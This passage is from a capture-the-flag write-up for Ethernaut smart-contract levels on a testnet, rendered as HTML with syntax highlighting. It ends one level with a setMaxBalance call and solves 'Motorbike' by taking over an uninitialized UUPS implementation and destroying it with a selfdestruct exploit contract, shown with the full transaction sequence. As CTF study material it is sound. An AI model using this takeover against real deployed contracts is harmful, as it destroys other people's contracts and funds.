class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">581</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">582</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">583</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">584</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">584</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x7a7a2f5db57ae7c8e485686fe796c3263ab73fd949d68b3c2dcf344f6b8216f0&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383220</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">37158</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">37158</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x015cfc32c92f00a41cdbc72d8d3bb120a2276bb02a53d9395c09e47e34d350fa&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">585</span>]: io.eth.get_balance(ad)</span><br><span class="line">Out[<span class="number">585</span>]: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In [<span class="number">586</span>]: setmaxbalance_selector = io.soliditySha3(abi_types=[<span class="string">&#x27;string&#x27;</span>],values=[<span class="string">&#x27;setMaxBalance(uint256)&#x27;</span>])[:<span class="number">4</span>].<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">In [<span class="number">587</span>]: setmaxbalance_selector</span><br><span class="line">Out[<span class="number">587</span>]: <span class="string">&#x27;0x9d51d9b7&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">592</span>]: calldata = setmaxbalance_selector + pub[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">593</span>]: calldata</span><br><span class="line">Out[<span class="number">593</span>]: <span class="string">&#x27;0x9d51d9b700000000000000000000000025Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">594</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">595</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">596</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">597</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">599</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">599</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xaacdaa8ad4732671a8bfcf4ce6024a4d9f5290b2750a6b192e474c9499f54f76&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383250</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">387033</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">33863</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0xx27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x41a43e208ed44d90dab73ee0f270b2c4979afcee54f1896f0b9d995d36011024&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">4</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><hr><h2 id="25-Motorbike"><a href="#25-Motorbike" class="headerlink" title="25 - Motorbike"></a>25 - Motorbike</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity &lt;<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-06/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Motorbike</span> &#123;</span><br><span class="line">    <span class="comment">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span></span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = <span class="number">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span>;</span><br><span class="line">    </span><br><span class="line">    struct <span class="title class_">AddressSlot</span> &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _logic</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title class_">Address</span>.<span class="title function_">isContract</span>(_logic), <span class="string">&quot;ERC1967: new implementation is not a contract&quot;</span>);</span><br><span class="line">        <span class="title function_">_getAddressSlot</span>(_IMPLEMENTATION_SLOT).<span class="property">value</span> = _logic;</span><br><span class="line">        (bool success,) = _logic.<span class="title function_">delegatecall</span>(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;initialize()&quot;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">&quot;Call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Delegates the current call to `implementation`.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_delegate</span>(<span class="params">address implementation</span>) internal virtual &#123;</span><br><span class="line">        <span class="comment">// solhint-disable-next-line no-inline-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="title function_">calldatacopy</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="title function_">calldatasize</span>())</span><br><span class="line">            <span class="keyword">let</span> result := <span class="title function_">delegatecall</span>(<span class="title function_">gas</span>(), implementation, <span class="number">0</span>, <span class="title function_">calldatasize</span>(), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="title function_">returndatacopy</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="title function_">returndatasize</span>())</span><br><span class="line">            <span class="keyword">switch</span> result</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> &#123; <span class="title function_">revert</span>(<span class="number">0</span>, <span class="title function_">returndatasize</span>()) &#125;</span><br><span class="line">            <span class="keyword">default</span> &#123; <span class="keyword">return</span>(<span class="number">0</span>, <span class="title function_">returndatasize</span>()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fallback function that delegates calls to the address returned by `_implementation()`. </span></span><br><span class="line">    <span class="comment">// Will run if no other function in the contract matches the call data</span></span><br><span class="line">    fallback () external payable virtual &#123;</span><br><span class="line">        <span class="title function_">_delegate</span>(<span class="title function_">_getAddressSlot</span>(_IMPLEMENTATION_SLOT).<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Returns an `AddressSlot` with member `value` located at `slot`.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_getAddressSlot</span>(<span class="params">bytes32 slot</span>) internal pure returns (<span class="title class_">AddressSlot</span> storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Engine</span> is <span class="title class_">Initializable</span> &#123;</span><br><span class="line">    <span class="comment">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span></span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = <span class="number">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span>;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct <span class="title class_">AddressSlot</span> &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">initialize</span>(<span class="params"></span>) external initializer &#123;</span><br><span class="line">        horsePower = <span class="number">1000</span>;</span><br><span class="line">        upgrader = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Upgrade the implementation of the proxy to `newImplementation`</span></span><br><span class="line">    <span class="comment">// subsequently execute the function call</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">upgradeToAndCall</span>(<span class="params">address newImplementation, bytes memory data</span>) external payable &#123;</span><br><span class="line">        <span class="title function_">_authorizeUpgrade</span>();</span><br><span class="line">        <span class="title function_">_upgradeToAndCall</span>(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Restrict to upgrader role</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_authorizeUpgrade</span>(<span class="params"></span>) internal view &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == upgrader, <span class="string">&quot;Can&#x27;t upgrade&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_upgradeToAndCall</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address newImplementation,</span></span><br><span class="line"><span class="params">        bytes memory data</span></span><br><span class="line"><span class="params">    </span>) internal &#123;</span><br><span class="line">        <span class="comment">// Initial upgrade and setup call</span></span><br><span class="line">        <span class="title function_">_setImplementation</span>(newImplementation);</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            (bool success,) = newImplementation.<span class="title function_">delegatecall</span>(data);</span><br><span class="line">            <span class="built_in">require</span>(success, <span class="string">&quot;Call failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Stores a new address in the EIP1967 implementation slot.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_setImplementation</span>(<span class="params">address newImplementation</span>) private &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title class_">Address</span>.<span class="title function_">isContract</span>(newImplementation), <span class="string">&quot;ERC1967: new implementation is not a contract&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">AddressSlot</span> storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.<span class="property">value</span> = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to <strong><code>selfdestruct</code></strong> the <code>Engine</code> contract and make it unusable. If we look at the contract <code>_upgradeToAndCall</code> function sets the <code>newImplementation</code> and <strong>delegatecallâ€™s</strong> it with the given data, so we can make our contract with the <code>selfdestruct</code> function and made the <code>Engine</code> contract <strong>to execute <code>selfdestruct</code> delegately the engine contract getâ€™s destroyed</strong>. but to run the <code>upgradeToAndCall</code> function we need to be the <code>upgrader</code> which is set in <code>initialize</code> function which has the <code>initializer</code> modifier. if we check the <code>Initializable</code> contract the modifier <code>initializer</code> doesnâ€™t track for the owner, anyone either a contractâ€™s constructor or an enternally owned account can call the <code>initialize</code> function. since we can call the <code>initialize</code> function we can become the <code>upgrader</code> and call the <code>upgradeToAndCall</code> function to our contract and execute the <code>selfdestruct</code> function to achive our goal.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">636</span>]: ad = <span class="string">&#x27;0x44b8d7b44f7DecE5204ddB076549e73E63C5133c&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">637</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">637</span>]: HexBytes(<span class="string">&#x27;0x000000000000000000003a78ee8462bd2e31133de2b8f1f9cbd973d6edd60001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">638</span>]: io.eth.get_storage_at(ad,<span class="number">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span>)</span><br><span class="line">Out[<span class="number">638</span>]: HexBytes(<span class="string">&#x27;0x000000000000000000000000e1a018e5720c1d6599bb58213fa8f2188803949f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">639</span>]: io.toChecksumAddress(<span class="string">&#x27;0xe1a018e5720c1d6599bb58213fa8f2188803949f&#x27;</span>)</span><br><span class="line">Out[<span class="number">639</span>]: <span class="string">&#x27;0xe1a018E5720c1D6599Bb58213fA8f2188803949f&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">640</span>]: ad = <span class="string">&#x27;0xe1a018E5720c1D6599Bb58213fA8f2188803949f&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">641</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">641</span>]: HexBytes(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">642</span>]: initialize_selector = io.soliditySha3(abi_types=[<span class="string">&#x27;string&#x27;</span>],values=[<span class="string">&#x27;initialize()&#x27;</span>])[:<span class="number">4</span>].<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">In [<span class="number">643</span>]: initialize_selector</span><br><span class="line">Out[<span class="number">643</span>]: <span class="string">&#x27;0x8129fc1c&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">644</span>]: calldata = initialize_selector.ljust(<span class="number">74</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">645</span>]: calldata</span><br><span class="line">Out[<span class="number">645</span>]: <span class="string">&#x27;0x8129fc1c0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">646</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">647</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">648</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">649</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">650</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">650</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x2af5b7e55ef346d8d2d67f88783ad36a80c5c50cf5e766c5a01f3b0313e4c80c&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383870</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">66676</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">3620000000</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">66676</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0xx27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xe1a018E5720c1D6599Bb58213fA8f2188803949f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x0a6f9a70d20aa6e24f269278a6e59955d8a287f69a38fbcc26f7eb5473077fd4&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">651</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">651</span>]: HexBytes(<span class="string">&#x27;0x0000000000000000000025bf651a048be8420997944c92c80e5064c1c5d60001&#x27;</span>)</span><br></pre></td></tr></table></figure><p>now we are the <code>upgrader</code> of the logic contract (not the proxy contract) and we can call the <code>upgradeToAndCall</code> function to destroy the contract.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public&#123;</span><br><span class="line">    <span class="title function_">selfdestruct</span>(<span class="title function_">payable</span>(<span class="title function_">address</span>(<span class="number">0x25Bf651a048be8420997944C92c80e5064C1c5d6</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">653</span>]: calldata = <span class="string">&#x27;0x4f1ef286000000000000000000000000aa63738a312c1c1a3e553b57423145d668877df40000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000463d9b77</span></span><br><span class="line"><span class="string">     ...: 000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">654</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">655</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">656</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">657</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">658</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">658</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xc309dbb2ec14e20f9859525903eee9c5f9fe9cd382b9099ed9f7f84f0dbd74a3&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383906</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">101255</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">4350000000</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">55011</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0xx27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xe1a018E5720c1D6599Bb58213fA8f2188803949f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x6d776c95cd5a581e01ccddda8c1ae26f2128f118de963401eca47516e2becc1b&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">659</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">659</span>]: HexBytes(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="26-DoubleEntryPoint"><a href="#26-DoubleEntryPoint" class="headerlink" title="26 - DoubleEntryPoint"></a>26 - DoubleEntryPoint</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 